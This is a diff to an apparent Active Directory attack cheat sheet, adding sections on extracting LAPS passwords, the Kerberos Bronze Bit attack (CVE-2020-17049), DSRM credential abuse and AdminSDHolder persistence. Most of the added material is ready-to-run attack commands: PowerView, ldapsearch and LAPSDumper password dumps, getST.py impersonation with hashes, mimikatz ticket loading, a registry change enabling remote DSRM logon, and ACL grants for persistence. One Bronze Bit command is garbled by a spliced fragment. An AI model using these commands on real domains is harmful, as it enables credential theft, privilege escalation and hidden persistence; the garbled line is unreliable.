@@ -31,6 +31,7 @@
       - [Spray a pre-generated passwords list](#spray-a-pre-generated-passwords-list)
       - [Spray passwords against the RDP service](#spray-passwords-against-the-rdp-service)
     - [Password in AD User comment](#password-in-ad-user-comment)
+    - [Reading LAPS Password](#reading-laps-password)
     - [Pass-the-Ticket Golden Tickets](#pass-the-ticket-golden-tickets)
       - [Using Mimikatz](#using-mimikatz)
       - [Using Meterpreter](#using-meterpreter)
@@ -65,9 +66,11 @@
     - [Kerberos Unconstrained Delegation](#kerberos-unconstrained-delegation)
     - [Kerberos Constrained Delegation](#kerberos-constrained-delegation)
     - [Kerberos Resource Based Constrained Delegation](#kerberos-resource-based-constrained-delegation)
+    - [Kerberos Bronze Bit Attack - CVE-2020-17049](#kerberos-bronze-bit-attack---cve-2020-17049)
     - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
     - [PrivExchange attack](#privexchange-attack)
     - [PXE Boot image attack](#pxe-boot-image-attack)
+    - [DSRM Credentials](#dsrm-credentials)
     - [Impersonating Office 365 Users on Azure AD Connect](#impersonating-office-365-users-on-azure-ad-connect)
   - [Linux Active Directory](#linux-active-directory)
     - [CCACHE ticket reuse from /tmp](#ccache-ticket-reuse-from-tmp)
@@ -971,6 +974,45 @@ or dump the Active Directory and `grep` the content.
 ldapdomaindump -u 'DOMAIN\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/
 ```
 
+
+### Reading LAPS Password
+
+> Use LAPS to automatically manage local administrator passwords on domain joined computers so that passwords are unique on each managed computer, randomly generated, and securely stored in Active Directory infrastructure. 
+
+#### Determine if LAPS is installed
+
+```ps1
+Get-ChildItem 'c:\program files\LAPS\CSE\Admpwd.dll'
+Get-FileHash 'c:\program files\LAPS\CSE\Admpwd.dll'
+Get-AuthenticodeSignature 'c:\program files\LAPS\CSE\Admpwd.dll'
+```
+
+#### Extract LAPS password
+
+> The "ms-mcs-AdmPwd" a "confidential" computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users
+
+* Powerview
+    ```powershell
+    PS > Import-Module .\PowerView.ps1
+    PS > Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
+    ```
+
+* ldapsearch
+    ```powershell
+    ldapsearch -x -h  -D "@" -w  -b "dc=<>,dc=<>,dc=<>" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd`
+    ```
+
+* LAPSDumper - https://github.com/n00py/LAPSDumper
+    ```powershell
+    python laps.py -u user -p password -d domain.local
+    python laps.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local
+    ```
+
+* Powershell AdmPwd.PS
+    ```powershell
+    foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
+    ```
+
 ### Pass-the-Ticket Golden Tickets
 
 Forging a TGT require the krbtgt NTLM hash
@@ -1041,7 +1083,7 @@ Mitigations:
 
 ### Pass-the-Ticket Silver Tickets
 
-Forging a TGS require machine accound password (key) or NTLM hash of the service account.
+Forging a TGS require machine account password (key) or NTLM hash of the service account.
 
 ```powershell
 # Create a ticket for the service
@@ -1410,11 +1452,7 @@ Find users with `AdminCount=1`.
 ```powershell
 python ldapdomaindump.py -u example.com\john -p pass123 -d ';' 10.100.20.1
 jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json
-``` 
-
-AdminSDHolder
-
-```powershell
+or
 Get-ADUser -LDAPFilter "(objectcategory=person)(samaccountname=*)(admincount=1)"
 Get-ADGroup -LDAPFilter "(objectcategory=group) (admincount=1)"
 or
@@ -1423,13 +1461,21 @@ or
 
 #### AdminSDHolder Abuse
 
-If you modify the permissions of **AdminSDHolder**, that permission template will be pushed out to all protected accounts automatically by SDProp.
+> The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all "protected groups" in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.
+
+If you modify the permissions of **AdminSDHolder**, that permission template will be pushed out to all protected accounts automatically by SDProp (in an hour).
+E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.
 
 ```powershell
-# right to reset password for toto using the account titi
+# Add a user to the AdminSDHolder group:
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
+
+# Right to reset password for toto using the account titi
 Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword
-# give all rights
+
+# Give all rights
 Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 ```
 
 
@@ -1619,12 +1665,14 @@ Prerequisite:
 
 ### Forest to Forest Compromise - Trust Ticket
 
+* Require: SID filtering disabled
+
 From the DC, dump the hash of the `currentdomain\targetdomain$` trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using 
 Mimikatz, adding the SID for the target domain's enterprise admins group to our **SID history**.
 
 #### Dumping trust passwords (trust keys)
 
-> Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing “$” are computer accounts, but some are trust accounts.
+> Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing **$** are computer accounts, but some are trust accounts.
 
 ```powershell
 lsadump::trust /patch
@@ -1839,6 +1887,56 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
     [+] Ticket successfully imported!
     ```
 
+### Kerberos Bronze Bit Attack - CVE-2020-17049
+
+> An attacker can impersonate users which are not allowed to be delegated. This includes members of the **Protected Users** group and any other users explicitly configured as **sensitive and cannot be delegated**.
+
+> Patch is out on November 10, 2020, DC are most likely vulnerable until [February 2021](https://support.microsoft.com/en-us/help/4598347/managing-deployment-of-kerberos-s4u-changes-for-cve-2020-17049).
+
+:warning: Patched Error Message : `[-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)`
+
+Requirements:
+* Service account's password hash 
+* Service account's with `Constrained Delegation` or `Resource Based Constrained Delegation`
+* [Impacket PR #1013](https://github.com/SecureAuthCorp/impacket/pull/1013) 
+
+**Attack #1** - Bypass the `Trust this user for delegation to specified services only – Use Kerberos only` protection and impersonate a user who is protected from delegation.
+
+```powershell
+# forwardable flag is only protected by the ticket encryption which uses the service account's password 
+$ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes <LM:NTLM hash> -aesKey <AES hash> test.local/Service1 -force-forwardable -dc-ip <Domain controller> # -> Forwardable
+
+$ getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4 test.local/Service1 -force-forwardable
+
+# Load the ticket
+.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit
+
+# Access "c$"
+ls \\service2.test.local\c$
+```
+
+**Attack #2** - Write Permissions to one or more objects in the AD
+
+```powershell
+# Create a new machine account
+Import-Module .\Powermad\powermad.ps1
+New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)
+.\mimikatz\mimikatz.exe "kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local" exit
+
+# Set PrincipalsAllowedToDelegateToAccount
+Install-WindowsFeature RSAT-AD-PowerShell
+Import-Module ActiveDirectory
+Get-ADComputer AttackerService
+Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
+Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount
+
+# Execute the attack
+python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardableet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
+
+# Load the ticket
+.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit | Out-Null
+```
+
 ### Relay delegation with mitm6
 
 Prerequisites: 
@@ -1963,6 +2061,24 @@ PXE allows a workstation to boot from the network by retrieving an operating sys
     >>>> >>>> UserPassword = Somepass1
     ```
 
+### DSRM Credentials
+
+> Directory Services Restore Mode (DSRM) is a safe mode boot option for Windows Server domain controllers. DSRM allows an administrator to repair or recover to repair or restore an Active Directory database.
+
+This is the local administrator account inside each DC. Having admin privileges in this machine, you can use mimikatz to dump the local Administrator hash. Then, modifying a registry to activate this password so you can remotely access to this local Administrator user.
+
+```ps1
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
+
+# Check if the key exists and get the value
+Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior 
+
+# Create key with value "2" if it doesn't exist
+New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD 
+
+# Change value to "2"
+Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
+```
 
 ### Impersonating Office 365 Users on Azure AD Connect
 
@@ -2148,3 +2264,6 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [ACE to RCE - @JustinPerdok - July 24, 2020](https://sensepost.com/blog/2020/ace-to-rce/)
 * [Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020](https://www.secura.com/pathtoimg.php?id=2055)
 * [Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-aces)
+* [CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation - Jake Karnes - December 8th, 2020](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/)
+* [CVE-2020-17049: Kerberos Bronze Bit Attack – Theory - Jake Karnes - December 8th, 2020](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/)
+* [Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory](https://www.hub.trimarcsecurity.com/post/leveraging-the-kerberos-bronze-bit-attack-cve-2020-17049-scenarios-to-compromise-active-directory)
